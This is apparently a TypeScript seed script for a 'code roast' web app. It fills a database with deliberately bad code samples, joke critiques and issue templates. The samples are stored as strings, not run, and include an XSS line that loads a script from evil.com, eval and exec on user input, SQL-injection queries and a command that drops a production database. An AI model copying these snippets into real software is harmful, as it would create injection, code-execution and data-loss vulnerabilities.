import "dotenv/config";
import { faker } from "@faker-js/faker";
import { drizzle } from "drizzle-orm/postgres-js";
import postgres from "postgres";
import { roastIssues, roasts } from "./schema";

const client = postgres(process.env.DATABASE_URL!);
const db = drizzle(client, { casing: "camelCase" });

// ─── Code samples ─────────────────────────────────────────────────────────────

const codeSamples: Record<string, string[]> = {
	javascript: [
		`var x = 1\nvar y = 2\nvar z = x + y\nconsole.log(z)`,
		`function getUserData(id) {\n  var data = null;\n  $.ajax({ url: '/api/users/' + id, async: false, success: function(r) { data = r; } });\n  return data;\n}`,
		`eval(atob(userInput))`,
		`function calculate(a, b, c, d, e, f, g) {\n  if (a) { if (b) { if (c) { if (d) { if (e) { if (f) { return g; } } } } } }\n}`,
		`var password = "admin123";\ndocument.cookie = "session=" + btoa(password);`,
		`setTimeout(function() {\n  setTimeout(function() {\n    setTimeout(function() {\n      doTheThing();\n    }, 1000);\n  }, 1000);\n}, 1000);`,
		`for (var i = 0; i < arr.length; i++) {\n  for (var j = 0; j < arr.length; j++) {\n    for (var k = 0; k < arr.length; k++) {\n      result.push(arr[i] + arr[j] + arr[k]);\n    }\n  }\n}`,
		`function isTrue(val) {\n  if (val == true) {\n    return true;\n  } else if (val == false) {\n    return false;\n  }\n}`,
		`const data = JSON.parse(JSON.stringify(JSON.parse(JSON.stringify(obj))));`,
		`document.write('<script src="http://evil.com/xss.js"></' + 'script>');`,
	],
	typescript: [
		`const data: any = fetchData();\nconst result: any = process(data as any);\nreturn result as any;`,
		`// @ts-ignore\n// @ts-ignore\n// @ts-ignore\nconst x = doSomething();`,
		`interface User {\n  name: any;\n  age: any;\n  data: any;\n  result: any;\n}`,
		`function doStuff(input: any): any {\n  return (input as any).thing as any;\n}`,
		`type Id = any;\ntype Name = any;\ntype Result = any;`,
		`const obj = {} as unknown as { secret: string };\nobj.secret = "password123";`,
		`async function fetchAll() {\n  const a = await fetch('/a');\n  const b = await fetch('/b');\n  const c = await fetch('/c');\n  // could use Promise.all but why bother\n}`,
		`enum Status {\n  Active = "active",\n  Inactive = "inactive",\n  MaybeActive = "maybe_active",\n  SortOfActive = "sort_of_active",\n  NotSureActive = "not_sure",\n}`,
	],
	python: [
		`import os\npassword = "admin123"\nos.system("mysql -u root -p" + password + " -e 'DROP DATABASE production'")`,
		`exec(input("enter python code: "))`,
		`def get_user(id):\n    query = "SELECT * FROM users WHERE id = " + str(id)\n    return db.execute(query)`,
		`l = lambda x: x if x else (lambda x: x if x else (lambda x: x)(x))(x)`,
		`def fibonacci(n):\n    if n <= 1:\n        return n\n    return fibonacci(n-1) + fibonacci(n-2)\n\nprint(fibonacci(9999))`,
		`with open("passwords.txt", "r") as f:\n    for line in f:\n        print(line)  # logging for debugging`,
		`try:\n    do_everything()\nexcept:\n    pass`,
		`global x\nglobal y\nglobal z\nx = y = z = []`,
	],
	sql: [
		`SELECT * FROM users WHERE username = '` + `' + username + '` + `' AND password = '` + `' + password + '` + `'`,
		`SELECT * FROM users, orders, products, categories, logs, sessions WHERE 1=1`,
		`DROP TABLE IF EXISTS users;\nDROP TABLE IF EXISTS orders;\nDROP TABLE IF EXISTS backups;\n-- TODO: add authentication`,
		`SELECT * FROM users;\n-- will optimize later`,
		`UPDATE users SET password = '123456' WHERE 1=1`,
		`SELECT u.*, o.*, p.*, c.*, s.*\nFROM users u, orders o, products p, categories c, sessions s`,
	],
	go: [
		`err := doSomething()\nif err != nil {\n  _ = err\n}`,
		`func main() {\n  for {\n    go doWork()\n    // goroutines are free right?\n  }\n}`,
		`var globalDB *sql.DB\nvar globalConfig Config\nvar globalLogger *log.Logger\nvar globalCache map[string]interface{}`,
		`func divide(a, b int) int {\n  return a / b // what could go wrong\n}`,
	],
	php: [
		`<?php\n$query = "SELECT * FROM users WHERE id = " . $_GET['id'];\nmysql_query($query);`,
		`<?php\n$password = md5($_POST['password']);\nif ($password == $stored) { /* login */ }`,
		`<?php\neval($_POST['code']);`,
		`<?php\necho $_GET['name']; // XSS? never heard of it`,
	],
	java: [
		`public static void main(String[] args) {\n  try {\n    doEverything();\n  } catch (Exception e) {\n    // it'll be fine\n  }\n}`,
		`String query = "SELECT * FROM users WHERE id = " + userId;\nStatement stmt = conn.createStatement();\nstmt.executeQuery(query);`,
		`public class GodClass {\n  // 4000 lines\n  // handles auth, db, email, pdf, payments, logging\n}`,
	],
	ruby: [
		`User.where("name = '#{params[:name]}'")`,
		`eval(params[:code])`,
		`rescue Exception => e\n  nil\nend`,
	],
	rust: [
		`fn main() {\n  let v: Vec<i32> = vec![1, 2, 3];\n  let x = v[99]; // lgtm\n}`,
		`unsafe {\n  let ptr = 0x0 as *mut i32;\n  *ptr = 42;\n}`,
	],
};

// ─── Roast texts ──────────────────────────────────────────────────────────────

const roastTexts = [
	"this code looks like it was written during a power outage... in 2005.",
	"i've seen better architecture in a sandcastle. at least that had a plan.",
	"congratulations, you've single-handedly made the case for no-code tools.",
	"your future self is already filing a restraining order against you.",
	"this is what happens when you learn to code from a youtube ad.",
	"somewhere, a junior dev is looking at this and feeling better about themselves.",
	"i've read ransom notes with better structure than this.",
	"the road to production hell is paved with intentions like these.",
	"this code has more red flags than a bullfighting convention.",
	"dear diary: today i saw code that made me question my career choice.",
	"whoever wrote this has never met a linter they couldn't ignore.",
	"even the garbage collector is refusing to touch this.",
	"this is technically code in the same way a hot dog is technically food.",
	"i'd suggest a refactor but honestly demolition seems more appropriate.",
	"the comments say 'TODO: fix later'. the git log says that was 3 years ago.",
	"this passes the turing test — for making humans want to cry.",
	"production is one deploy away from an apology email to all users.",
	"this looks like it was pair-programmed by two people who hate each other.",
	"the cyclomatic complexity of this function is higher than my blood pressure.",
	"somewhere a computer science professor is using this as a cautionary tale.",
	"this code has more coupling than a train yard.",
	"i've debugged malware that was better organized than this.",
	"security review: lol, lmao even.",
	"this function does so many things it needs its own sprint.",
	"the naming convention seems to be 'whatever i was thinking at 2am'.",
];

// ─── Issue templates ──────────────────────────────────────────────────────────

const criticalIssues = [
	{
		title: "sql injection vulnerability",
		description:
			"user input is concatenated directly into sql queries. this is textbook sql injection. use parameterized queries or an orm.",
	},
	{
		title: "hardcoded credentials",
		description:
			"passwords and secrets are hardcoded in source code. rotate these immediately and use environment variables.",
	},
	{
		title: "eval on user input",
		description:
			"passing user-controlled data to eval() is arbitrary code execution waiting to happen. never do this.",
	},
	{
		title: "synchronous blocking call",
		description:
			"async: false blocks the main thread entirely. the browser freezes. users notice. use promises or async/await.",
	},
	{
		title: "xss via document.write",
		description:
			"injecting unsanitized content into the dom is a cross-site scripting vulnerability. sanitize all output.",
	},
	{
		title: "unbounded recursion",
		description:
			"this recursive call has no memoization and will stack overflow on any meaningful input. add memoization or use iteration.",
	},
	{
		title: "swallowed exception",
		description:
			"catching all exceptions and doing nothing hides bugs silently. at minimum log the error. better: handle it.",
	},
	{
		title: "o(n³) complexity",
		description:
			"triple nested loops over the same array is cubic time complexity. this will grind to a halt at scale.",
	},
];

const warningIssues = [
	{
		title: "var instead of const/let",
		description:
			"var is function-scoped and causes hoisting bugs. use const by default, let when reassignment is needed.",
	},
	{
		title: "overuse of any type",
		description:
			"annotating everything as any defeats the purpose of typescript. define proper interfaces for your data shapes.",
	},
	{
		title: "imperative loop pattern",
		description:
			"for loops are verbose and error-prone here. use .map(), .filter(), or .reduce() for cleaner transformations.",
	},
	{
		title: "no error handling",
		description:
			"async operations without try/catch will throw unhandled promise rejections. wrap in try/catch or .catch().",
	},
	{
		title: "sequential awaits",
		description:
			"awaiting requests one by one when they're independent wastes time. use promise.all() for parallel execution.",
	},
	{
		title: "magic numbers",
		description:
			"unexplained numeric literals scattered through the code. extract them as named constants with clear intent.",
	},
	{
		title: "global state mutation",
		description:
			"mutating global variables from multiple places makes state unpredictable and debugging painful.",
	},
	{
		title: "boolean logic inversion",
		description:
			"returning `if (x == true) return true` is just `return x`. this is cargo-cult programming.",
	},
];

const goodIssues = [
	{
		title: "clear naming conventions",
		description:
			"variable and function names are descriptive and communicate intent without needing comments.",
	},
	{
		title: "single responsibility",
		description:
			"the function does one thing well — no side effects, no mixed concerns, no hidden complexity.",
	},
	{
		title: "consistent indentation",
		description:
			"formatting is consistent throughout. the code is at least visually readable.",
	},
	{
		title: "early return pattern",
		description:
			"guard clauses at the top reduce nesting and make the happy path easy to follow.",
	},
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function getVerdict(score: number): "catastrophic" | "needs_serious_help" | "questionable" | "mediocre" | "acceptable" {
	if (score < 2.0) return "catastrophic";
	if (score < 4.0) return "needs_serious_help";
	if (score < 6.0) return "questionable";
	if (score < 8.0) return "mediocre";
	return "acceptable";
}

function pickRandom<T>(arr: T[]): T {
	return arr[Math.floor(Math.random() * arr.length)];
}

function generateScore(): number {
	// Weighted distribution: most scores are low (it's a roast app)
	const rand = Math.random();
	let raw: number;
	if (rand < 0.35) raw = faker.number.float({ min: 0.5, max: 2.0 });       // 35% catastrophic
	else if (rand < 0.65) raw = faker.number.float({ min: 2.0, max: 4.0 });  // 30% needs_serious_help
	else if (rand < 0.82) raw = faker.number.float({ min: 4.0, max: 6.0 });  // 17% questionable
	else if (rand < 0.94) raw = faker.number.float({ min: 6.0, max: 8.0 });  // 12% mediocre
	else raw = faker.number.float({ min: 8.0, max: 9.8 });                   //  6% acceptable
	return Math.round(raw * 10) / 10;
}

function generateIssues(count: number) {
	const issues = [];
	// Always at least 1 critical, 1 warning, optionally 1 good
	issues.push({ ...pickRandom(criticalIssues), severity: "critical" as const });
	issues.push({ ...pickRandom(warningIssues), severity: "warning" as const });
	if (count >= 3) issues.push({ ...pickRandom(warningIssues), severity: "warning" as const });
	if (count >= 4) issues.push({ ...pickRandom(goodIssues), severity: "good" as const });
	return issues;
}

// ─── Seed ─────────────────────────────────────────────────────────────────────

async function seed() {
	console.log("🌱 Seeding database...");

	// Clear existing data
	await db.delete(roastIssues);
	await db.delete(roasts);
	console.log("🗑️  Cleared existing data");

	const languages = Object.keys(codeSamples) as Array<keyof typeof codeSamples>;

	const roastData = Array.from({ length: 100 }, () => {
		const language = pickRandom(languages);
		const code = pickRandom(codeSamples[language]);
		const score = generateScore();

		return {
			code,
			language: language as "javascript" | "typescript" | "python" | "sql" | "go" | "rust" | "java" | "php" | "ruby" | "other",
			lineCount: code.split("\n").length,
			roastMode: Math.random() > 0.5,
			score: String(score),
			verdict: getVerdict(score),
			roastText: pickRandom(roastTexts),
			suggestedFix: Math.random() > 0.4
				? `// suggested fix\n${faker.lorem.lines(faker.number.int({ min: 2, max: 5 }))}`
				: null,
			onLeaderboard: score < 4.0,
			createdAt: faker.date.recent({ days: 90 }),
		};
	});

	// Batch insert all roasts and get back IDs
	const inserted = await db
		.insert(roasts)
		.values(roastData)
		.returning({ id: roasts.id });

	console.log(`✅ Inserted ${inserted.length} roasts`);

	// Generate issues for each roast
	const issueData = inserted.flatMap(({ id }, i) => {
		const count = faker.number.int({ min: 2, max: 4 });
		return generateIssues(count).map((issue, position) => ({
			roastId: id,
			severity: issue.severity,
			title: issue.title,
			description: issue.description,
			position,
		}));
	});

	await db.insert(roastIssues).values(issueData);

	console.log(`✅ Inserted ${issueData.length} roast issues`);
	console.log("🎉 Seed complete!");

	await client.end();
}

seed().catch((err) => {
	console.error("❌ Seed failed:", err);
	process.exit(1);
});
